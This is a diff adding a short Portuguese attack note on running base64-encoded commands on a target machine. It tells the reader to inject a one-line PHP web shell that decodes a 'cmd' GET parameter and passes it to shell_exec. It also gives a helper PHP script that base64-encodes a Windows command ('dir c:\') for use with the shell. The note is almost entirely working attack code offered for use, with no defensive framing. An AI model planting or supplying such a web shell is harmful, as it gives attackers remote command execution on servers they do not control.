@@ -1,0 +1,19 @@
+----------------------------------------------
+ Executar comandos com base64 na máquina alvo 
+---------------------------------------------- 
+
+Injetar o seguinte código:
+
+<?php echo shell_exec(base64_decode($_GET["cmd"]));?>
+
+Utilizar um arquivo.php para alterar o comando
+
+php cmd.php
+
+"""
+	<?php
+		$comando="dir c:\\";
+		$data=base64_encode($comando);
+		echo $data;
+	?>
+"""
